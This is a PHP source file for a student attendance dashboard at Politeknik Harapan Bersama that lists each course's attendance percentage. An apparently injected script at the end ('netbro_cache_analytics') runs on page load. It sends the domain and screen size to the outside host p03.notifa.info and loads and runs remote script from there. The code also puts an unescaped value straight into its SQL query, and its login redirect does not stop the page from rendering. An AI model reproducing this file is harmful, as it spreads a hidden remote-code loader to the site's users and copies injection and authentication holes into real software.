<?php include "../koneksi.php"; ?>

<!DOCTYPE html>
<html lang="en" dir="">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Absensi || Politeknik Harapan Bersama</title>
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,400i,600,700,800,900" rel="stylesheet" />
    <link href="../assets/css/themes/lite-purple.min.css" rel="stylesheet" />
    <link href="../assets/css/plugins/perfect-scrollbar.min.css" rel="stylesheet" />
    <script src="../assets/js/plugins/jquery-3.3.1.min.js"></script>
    <link rel="shortcut icon" href="../assets/images/logo-poltek.png" type="image/x-icon">
</head>

<body class="text-left">
    <?php
        session_start();
        if($_SESSION['status']!="login"){
            header("location:../index.php?pesan=belum_login");
        }
    ?>
    <div class="app-admin-wrap layout-sidebar-large">
        <div class="main-header">
            <div class="logo">
                <img src="../assets/images/logo-poltek.png" alt="">
            </div>
            <div class="menu-toggle">
                <div></div>
                <div></div>
                <div></div>
            </div>

            <div style="margin: auto"></div>
            <div class="header-part-right">

                <div class="dropdown">
                    <div class="user col align-self-end">
                        <img src="../assets/images/faces/1.jpg" id="userDropdown" alt="" data-toggle="dropdown"
                            aria-haspopup="true" aria-expanded="false">
                        <div class="dropdown-menu dropdown-menu-right" aria-labelledby="userDropdown">
                            <div class="dropdown-header">
                                <i class="i-Lock-User mr-1"></i> <?php echo $_SESSION['nama']; ?>
                            </div>
                            <a class="dropdown-item">Account settings</a>
                            <a class="dropdown-item" href="../logout.php">Sign out</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="side-content-wrap">
            <div class="sidebar-left open rtl-ps-none" data-perfect-scrollbar="" data-suppress-scroll-x="true">
                <ul class="navigation-left">
                    <li class="nav-item"><a class="nav-item-hold" href="index.php"><i
                                class="nav-icon i-Bar-Chart"></i><span class="nav-text">Dashboard</span></a>
                        <div class="triangle"></div>
                    </li>
                </ul>
            </div>

            <div class="sidebar-overlay"></div>
        </div>
        <div class="main-content-wrap sidenav-open d-flex flex-column">
            <div class="main-content">
                <table>
                    <tr>
                        <td>Nama</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp; :</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp; <?php echo $_SESSION['nama'] ?></td>
                    </tr>
                    <tr>
                        <td>NIM</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp;:</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp;<?php echo $_SESSION['nim'] ?></td>
                    </tr>
                    <tr>
                        <td>Kelas</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp;:</td>
                        <td>&nbsp; &nbsp; &nbsp; &nbsp;<?php echo $_SESSION['kelas'] ?></td>
                    </tr>
                </table>

                <?php 
                
                $semester = $_SESSION['semester'];



                ?>

                

                <table class="table table-bordered table-hover table-striped">
                    <thead class="thead-dark">
                        <tr>
                            <th style="text-align: center">Nama Matkul</th>
                            <th style="text-align: center">Kehadiran (%)</th>
                        </tr>
                    </thead>
                <?php

                    $nim = $_SESSION['nim'];
                    
                    $query = "SELECT absen.id_matkul, nim, COUNT(absen.status) as kehadiran, matkul.id_matkul, 
                    nama_matkul, nidn, semester FROM absen INNER JOIN matkul ON absen.id_matkul = matkul.id_matkul 
                    WHERE nim=$nim GROUP BY absen.id_matkul ";
                    $matkul = mysqli_query($koneksi, $query);
                    while($m = mysqli_fetch_array($matkul)){
                ?>
                    <tbody>
                        <tr>
                            <td style="text-align: center"><?php echo $m['nama_matkul'] ?></td>
                            <td style="text-align: center">
                            <?php 
                                $jumlah = $m['kehadiran'];

                                $hasil  = round($jumlah/14 * 100);

                                echo $hasil;
                            ?></td>
                        </tr>
                    </tbody>
                <?php } ?>
                </table>
            </div>
            <div class="flex-grow-1"></div>
            <div class="app-footer">
                <div class="footer-bottom border-top pt-3 d-flex flex-column flex-sm-row align-items-center">
                    <span class="flex-grow-1"></span>
                    <div class="d-flex align-items-center">
                        <img class="logo" src="../assets/images/logo.png" alt="">
                        <div>
                            <p class="m-0">&copy; 2019 Politeknik Harapan Bersama</p>
                            <p class="m-0">Teknik Informatika</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>


    <script src="../assets/js/plugins/bootstrap.bundle.min.js"></script>
    <script src="../assets/js/plugins/perfect-scrollbar.min.js"></script>
    <script src="../assets/js/scripts/script.min.js"></script>
    <script src="../assets/js/scripts/sidebar.large.script.min.js"></script>
    <script src="../assets/js/plugins/echarts.min.js"></script>
    <script src="../assets/js/scripts/echart.options.min.js"></script>
    <script src="../assets/js/scripts/dashboard.v1.script.min.js"></script>
    <script src="../assets/js/scripts/customizer.script.min.js"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAE%2fovJHwbA57922Ev%2f6MGgTsr4OzD95%2fHBxLfsOZm4%2bFmJcOwBKpJ57J2SNXoBiVFrmfOhDeXeT5MDkTfVWc84DCwV1RlV1op7P8Y5TdHzp84UMhNMKGJ8daZDUIfcUdCCZcGKilPkgiXDCcqSAVpHvDLJFQV%2f1oT3CcCCRJTPIt45VW3g%2bboePI2fR2H0caVe4r0AEnSzEUHe8tvbt%2fr4FvK%2bWivvX61nhiyt761BBYR9PpSb02FeOah9EMlAC6QEEoWCjji%2fwKfcKuPRHtPjyuY0AUNeMNCq8rt4fE%2b3f3DhWpOBkYG31PXLr1usvAZkEWpEjHK4X%2flhejNd5g1eFveSs45J4wf%2bWr3V4gvCREJQV4Pqr4whV9lQ6QdA1p%2f8YlphH76eVg0rzI2taCpQT9wMaQ4A4eOTN5%2bgDUMl0HNbHAdCu7Aev1vc6J32nRKG%2byHRTjm5vrh6sxSsgAW4w%3d%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
</body>

</html>